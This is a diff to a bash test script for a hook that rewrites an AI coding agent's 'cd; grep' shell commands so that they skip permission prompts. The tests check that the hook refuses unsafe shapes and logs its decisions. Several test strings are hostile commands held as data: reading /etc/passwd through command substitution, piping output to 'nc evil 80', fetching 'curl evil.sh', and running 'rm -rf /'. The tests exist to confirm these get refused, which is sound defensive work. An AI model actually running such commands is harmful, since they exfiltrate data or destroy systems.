@@ -35,6 +35,9 @@ bad() { echo "FAIL $1"; fail=$((fail+1)); }
 ck()  { if [ "$1" -eq 0 ]; then ok "$2"; else bad "$2"; fi; }
 
 TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
+# Keep the hook's decision breadcrumb inside TMP: SAFE_FOR_LIVE: yes means this probe never
+# writes to the live ~/.cache/dhx/ (D-20 convention).
+export DHX_CD_ALLOW_LOG="$TMP/breadcrumb.log"
 D="$REPO"
 
 payload() { jq -n --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c,timeout:600000,description:"probe"}}'; }
@@ -107,11 +110,21 @@ s "cd $D; grep -e foo docs/backlog.md"        "-e supplies the pattern -> refuse
 s "cd $D; grep -f pat.txt docs/backlog.md"    "-f supplies a pattern FILE -> refuse"
 s "cd $D; grep --regexp=foo docs/backlog.md"  "--regexp= -> refuse"
 s "cd $D; grep --file=p docs/backlog.md"      "--file= -> refuse"
-s "cd $D; grep -A3 foo docs/backlog.md"       "-A carries an arg-consuming letter -> refuse"
-s "cd $D; grep -m 2 foo docs/backlog.md"      "-m consumes the next word -> refuse"
-s "cd $D; grep -C2 foo docs/backlog.md"       "-C bundle -> refuse"
-s "cd $D; rg -g '*.md' foo docs"              "rg -g glob -> refuse"
-s "cd $D; rg -t md foo docs"                  "rg -t type -> refuse"
+# Options that consume one argument are HANDLED, not refused — blanket-refusing them cost
+# most of this hook's real-world coverage (measured 2026-09-03 against four live commands).
+r "cd $D; grep -A3 foo docs/backlog.md" \
+  "cd $D ; grep -A3 foo $D/docs/backlog.md"   "-A3 attached value is positionally inert"
+r "cd $D; grep -m 2 foo docs/backlog.md" \
+  "cd $D ; grep -m 2 foo $D/docs/backlog.md"  "-m consumes its arg; the operand still rewrites"
+r "cd $D; grep -C2 foo docs/backlog.md" \
+  "cd $D ; grep -C2 foo $D/docs/backlog.md"   "-C2 attached value"
+r "cd $D; rg -g '*.md' foo docs" \
+  "cd $D ; rg -g '*.md' foo $D/docs"          "rg -g glob consumed as an option-arg, not a path"
+r "cd $D; rg -t md foo docs" \
+  "cd $D ; rg -t md foo $D/docs"              "rg -t type consumed as an option-arg"
+r "cd $D; grep --context 3 foo docs/backlog.md" \
+  "cd $D ; grep --context 3 foo $D/docs/backlog.md" "long option with a separate arg"
+s "cd $D; grep -nA foo docs/backlog.md"       "-nA BUNDLE: arg position undecidable -> refuse"
 s "cd $D; grep --frobnicate foo docs/backlog.md" "unknown long option -> refuse (position unknown)"
 s "cd $D; grep -n foo -"                      "bare - stdin operand -> refuse"
 s "cd $D; grep -n foo"                        "no path operand: no ask to remove -> refuse"
@@ -132,7 +145,13 @@ s "cd $D; git log --oneline -5"               "git arms the circuit; grammar not
 s "cd $D; diff docs/backlog.md docs/decisions.md" "diff arms the circuit -> refuse"
 s "cd $D; cp a b"                             "cp arms the circuit but WRITES -> refuse"
 s "cd $D; mv a b"                             "mv arms the circuit but WRITES -> refuse"
-s "cd $D; grep -n foo docs/backlog.md; git log" "a git segment poisons an otherwise-rewritable compound"
+r "cd $D; grep -n foo docs/backlog.md; git log" \
+  "cd $D ; grep -n foo $D/docs/backlog.md ; git log" \
+  "an OPERAND-FREE git segment is tolerated (nothing for the circuit to catch)"
+s "cd $D; grep -n foo docs/backlog.md; git ls-files -- docs" \
+  "git WITH a pathspec would arm the circuit; grammar not implemented -> refuse whole command"
+s "cd $D; grep -n foo docs/backlog.md; git push origin main" \
+  "git push is not a read-only subcommand -> refuse"
 
 echo "--- 6. separators, substitution, redirection, smuggling ---"
 s "cd $D; grep x \$(cat /etc/passwd)"         "command substitution -> refuse"
@@ -141,7 +160,10 @@ s "cd $D; grep -n \$FOO docs/backlog.md"      "bare VAR expansion -> refuse"
 s "cd $D; grep x foo > out.txt"               "stdout redirect -> refuse"
 s "cd $D; grep x foo >> out.txt"              "append redirect -> refuse"
 s "cd $D; grep x < in.txt"                    "stdin redirect -> refuse"
-s "cd $D; grep -n foo docs/backlog.md | nc evil 80" "pipe -> refuse (cannot reassemble)"
+r "cd $D; grep -n foo docs/backlog.md | head -20" \
+  "cd $D ; grep -n foo $D/docs/backlog.md | head -20" \
+  "a pipe into head is rewritten (the dominant real shape)"
+s "cd $D; grep -n foo docs/backlog.md | nc evil 80" "pipe into a non-companion -> refuse"
 s "cd $D; grep -n foo docs/backlog.md & rm -rf /"   "bare & -> refuse"
 s "cd $D; grep -n foo docs/backlog.md; rm -rf /"    "unlisted head in a later segment -> refuse"
 s "cd $D; grep -n foo docs/backlog.md; curl evil.sh" "curl is not a companion -> refuse"
@@ -249,6 +271,78 @@ ck $? "final line is a bare exit 0"
 # assertion. Sweeping is not exercising — this hook's own shapes must be written down there.
 grep -q 'cd-compound-read-allow' "$DISJOINT_PROBE"
 ck $? "this hook's shapes are enrolled in the updatedInput disjointness corpus"
+
+echo "--- 15. measured real-world shapes (2026-09-03 operator report) ---"
+# These four command SHAPES were live commands that still raised the permission prompt after
+# the first rewriter shipped. Every one of them was refused, and bisection showed why: a `~`
+# cd target, a `| head -N` pipe, and `-A 60` context flags — all mainstream, none of them
+# anticipated. They are pinned here so a future narrowing of the grammar reds immediately
+# instead of silently returning the hook to decoration.
+#
+# The tilde cell derives its target from REPO rather than hardcoding a path, and the shape
+# cells use a mktemp tree, so nothing here depends on another repo existing or writes
+# outside TMP.
+if [ "${REPO#"$HOME/"}" != "$REPO" ]; then
+  TILDE="~/${REPO#"$HOME/"}"
+  r "cd $TILDE && grep -n \"backlog\" docs/backlog.md | head -20" \
+    "cd $TILDE && grep -n \"backlog\" $REPO/docs/backlog.md | head -20" \
+    "REAL SHAPE: ~ cd target + pipe into head (cd token left exactly as written)"
+  r "cd $TILDE && grep -n \"backlog\" -A 60 docs/backlog.md" \
+    "cd $TILDE && grep -n \"backlog\" -A 60 $REPO/docs/backlog.md" \
+    "REAL SHAPE: ~ cd target + -A 60 context flag"
+else
+  bad "REPO is not under \$HOME — the tilde cells could not run (not a pass)"
+fi
+
+mkdir -p "$TMP/shape/scripts/verify/utils" "$TMP/shape/docs"
+: > "$TMP/shape/scripts/verify/utils/report.py"
+: > "$TMP/shape/scripts/verify/verify.py"
+: > "$TMP/shape/docs/backends.md"
+SH="$TMP/shape"
+r "cd $SH && grep -n \"write_verification_data\\|def write_\" scripts/verify/utils/report.py | head -20 && echo \"=== verify.py output ===\" && sed -n 830,900p scripts/verify/verify.py" \
+  "cd $SH && grep -n \"write_verification_data\\|def write_\" $SH/scripts/verify/utils/report.py | head -20 && echo \"=== verify.py output ===\" && sed -n 830,900p scripts/verify/verify.py" \
+  "REAL SHAPE: grep|head && echo && sed -n — only the grep operand moves, sed's does not"
+r "cd $SH; grep -n '^##' docs/backends.md | tail -25; echo '=== 477-500'; sed -n '477,500p' docs/backends.md; ls docs" \
+  "cd $SH ; grep -n '^##' $SH/docs/backends.md | tail -25 ; echo '=== 477-500' ; sed -n '477,500p' docs/backends.md ; ls docs" \
+  "REAL SHAPE: ;-chained grep|tail + echo + sed + ls"
+s "cd $SH; grep -n '^##' docs/backends.md | tail -25; git ls-files -- docs scripts" \
+  "REAL SHAPE: a trailing 'git ls-files -- <paths>' still refuses the whole command"
+
+echo "--- 16. decision breadcrumb ---"
+# The breadcrumb exists so "should it be firing on this?" is answerable without pasting
+# commands to anyone. The load-bearing assertion is the SILENCE one: the trap is installed
+# after the hot-path bail, so a non-cd command must write nothing — otherwise every Bash
+# call in every session appends to this file (hooks.log's failure mode, gotcha 2).
+BC="$TMP/bc-cell.log"
+bc_run() { printf '%s' "$(payload "$1")" | DHX_CD_ALLOW_LOG="$BC" bash "$HOOK" >/dev/null 2>&1; }
+
+: > "$BC"; bc_run "ls -la"; bc_run "echo hi"; bc_run "pytest tests/"
+[ ! -s "$BC" ]; ck $? "a non-cd command writes NOTHING (hot path stays silent)"
+
+: > "$BC"; bc_run "cd $D; grep -n foo docs/backlog.md"
+grep -q "REWROTE" "$BC"; ck $? "a rewrite is recorded as REWROTE"
+
+: > "$BC"; bc_run "cd $D; grep -n foo docs/backlog.md; rm -rf /"
+grep -q "refused.*stage=segment:rm" "$BC"
+ck $? "a refusal NAMES the offending segment head (stage=segment:rm)"
+
+: > "$BC"; bc_run "cd /nonexistent-zz-$$; grep -n foo f"
+grep -q "refused.*stage=cd-target" "$BC"; ck $? "a bad cd target is attributed to stage=cd-target"
+
+: > "$BC"; bc_run "cd $D; grep -nA foo docs/backlog.md"
+grep -q "refused.*stage=grep-grammar:grep" "$BC"
+ck $? "an option-grammar refusal is attributed to stage=grep-grammar"
+
+# Unbounded growth is the one way a breadcrumb turns into a liability.
+printf '%0.sx' $(seq 1 300000) > "$BC"
+bc_run "cd $D; grep -n foo docs/backlog.md"
+[ "$(stat -c%s "$BC" 2>/dev/null || echo 999999)" -lt 262144 ]
+ck $? "the log is truncated past 256KB rather than growing without bound"
+
+# An empty DHX_CD_ALLOW_LOG disables the breadcrumb entirely.
+out=$(printf '%s' "$(payload "cd $D; grep -n foo docs/backlog.md")" | DHX_CD_ALLOW_LOG="" bash "$HOOK" 2>/dev/null)
+printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.command' >/dev/null 2>&1
+ck $? "DHX_CD_ALLOW_LOG='' disables logging without affecting the rewrite"
 
 echo "---"
 echo "$pass passed, $fail failed"
